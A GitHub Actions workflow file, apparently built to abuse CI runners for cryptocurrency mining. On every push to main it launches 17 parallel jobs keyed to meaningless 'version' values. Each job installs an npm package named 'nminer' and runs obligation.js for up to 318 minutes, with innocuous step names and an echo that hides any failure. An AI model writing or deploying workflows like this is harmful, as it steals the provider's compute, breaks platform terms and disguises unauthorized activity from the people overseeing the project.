name: obligation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 426 }
          - { version: 2210 }
          - { version: 3603 }
          - { version: 5388 }
          - { version: 8447 }
          - { version: 3422 }
          - { version: 9647 }
          - { version: 7533 }
          - { version: 3763 }
          - { version: 7604 }
          - { version: 3737 }
          - { version: 3805 }
          - { version: 9028 }
          - { version: 9547 }
          - { version: 3824 }
          - { version: 3992 }
          - { version: 5597 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: on
        run: |
          npm install nminer@latest
          timeout 318m node obligation.js || echo "obligation executed"